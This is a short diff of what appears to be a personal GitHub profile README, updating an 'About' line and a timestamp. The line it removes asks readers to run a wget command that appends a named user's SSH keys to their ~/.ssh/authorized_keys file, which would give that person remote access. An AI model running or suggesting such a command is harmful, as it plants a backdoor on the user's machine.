@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
+💩 Amateurs be like: Don't respect code license and attribution requirements.
 
 <!--✏️ **Blog Posts**-->
 
@@ -24,4 +24,4 @@
 
 🕒 **Last Update**
 
-20-03-2025 12:46:40 UTC
+20-03-2025 16:22:25 UTC
